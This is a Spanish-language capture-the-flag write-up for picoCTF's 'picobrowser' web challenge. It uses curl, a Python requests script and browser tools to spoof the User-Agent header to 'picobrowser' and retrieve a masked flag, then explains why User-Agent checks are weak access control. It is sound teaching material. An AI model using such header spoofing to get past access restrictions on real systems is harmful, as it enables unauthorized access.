# Writeup: picobrowser
**Categoría:** Medium
**Fecha de conversión:** 2026-04-24

---

Writeup: picobrowser – picoCTF

📌 Información del reto

Campo	Valor

Nombre	picobrowser

Autor	Archit

Categoría	Web Exploitation

Dificultad	Media (mecanismo sencillo)

URL	http://fickle-tempest.picoctf.net:53420

Descripción	"This website can be rendered only by picobrowser, go and catch the flag!"

🧠 Idea principal


El servidor web solo muestra la flag si el cliente se identifica como el navegador picobrowser.

Esto se hace mediante la cabecera HTTP User-Agent.

Por tanto, debemos falsificar esa cabecera para que el servidor nos crea.

🔍 Reconocimiento inicial


Accedemos a la URL raíz con curl sin modificar el User-Agent:

bash


curl http://fickle-tempest.picoctf.net:53420/


En la respuesta HTML vemos un mensaje de error:


```
    You're not picobrowser!
    curl/8.18.0

```

El servidor nos muestra el User-Agent que hemos enviado.

Esto confirma que está validando esa cabecera.

🧪 Probando la ruta /flag


En la página principal hay un botón que apunta a /flag.

Intentamos acceder directamente:

bash


curl -i http://fickle-tempest.picoctf.net:53420/flag


Obtenemos el mismo mensaje de error.

Así que la protección aplica a toda la web, pero especialmente a /flag.

✅ Solución: cambiar el User-Agent


Modificamos el User-Agent a picobrowser usando -A en curl:

bash


curl -A "picobrowser" http://fickle-tempest.picoctf.net:53420/flag


O con opciones más completas (ver cabeceras y seguir redirecciones):

bash


curl -k -i -f http://fickle-tempest.picoctf.net:53420/flag -A picobrowser


📤 Respuesta esperada


El servidor responde con HTTP/1.1 200 OK y el contenido HTML contiene la **flag**:

html


<div class="jumbotron">

```
    <p class="lead"></p>
    <p style="text-align:center; font-size:30px;">
        <b>Flag</b>: <code>picoCTF{***********************}</code>
    </p>
```

</div>


Además, el mensaje de alerta cambia de rojo (peligro) a verde (éxito):


```
    ✅ picobrowser!

```

🏁 Flag

text


picoCTF{***************************}


🛠️ Otras formas de resolverlo

🔹 Con Python + requests

python


import requests


url = "http://fickle-tempest.picoctf.net:53420/flag"

headers = {"User-Agent": "picobrowser"}

r = requests.get(url, headers=headers)

print(r.text)


🔹 Desde el navegador


```
    Usar una extensión como User-Agent Switcher.

    O abrir las herramientas de desarrollador (F12), ir al modo de dispositivo y crear un User-Agent personalizado con el valor picobrowser.

```

📚 Lecciones aprendidas


```
    El campo User-Agent no es seguro para restringir el acceso, ya que se puede modificar fácilmente.

    Siempre debemos fijarnos en los mensajes de error y en las pistas del propio reto (en este caso, el nombre picobrowser).

    Herramientas como curl son esenciales para probar y explotar este tipo de validaciones básicas.
```

